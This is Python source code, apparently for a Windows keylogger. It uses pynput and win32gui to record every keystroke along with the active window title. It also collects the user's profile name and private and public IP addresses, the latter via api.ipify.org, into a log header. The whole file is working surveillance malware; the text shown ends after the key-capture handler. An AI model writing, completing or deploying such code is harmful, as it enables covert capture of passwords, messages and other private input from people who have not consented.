from pynput.keyboard import Key, Listener
import time
import os
import requests
import socket
import win32gui

datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []

def on_press(key):
    global old_app

    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        logged_data.append(f'[{datetime}] ~ {new_app}\n')
        old_app = new_app
    else:
        pass

    substitution = {'Key.enter' : '[ENTER]\n', 'Key.backspace': '[BACKSPACE]', 'Key.space': ' ',
                    'Key.alt_l': '[ALT]', 'Key.tab': '[TAB]', 'Key.delete': '[DEL]', 'Key.ctrl_l': '[CTRL]',
                    'Key.left': '[LEFT ARROW]', 'Key.right': '[RIGHT ARROW]', 'Key.shift': '[SHIFT]', '\\x13':
                    '[CTRL-S]', '\\x17': '[CTRL-W]', 'Key.caps_lock': '[CAPS LK]', '\\x01': '[CTRL-A]', 'Key.cmd':
                    '[WINDOWS KEY]', 'Key.print_screen': '[PRNT SCR]', '\\x03': '[CTRL-C]', '\\x16': '[CTRL-V]'}

    key = str(key).strip('\'')
    
    if key in substitution:
        logged_data.append(substitution[key])
    else:
        logged_data.append(key)

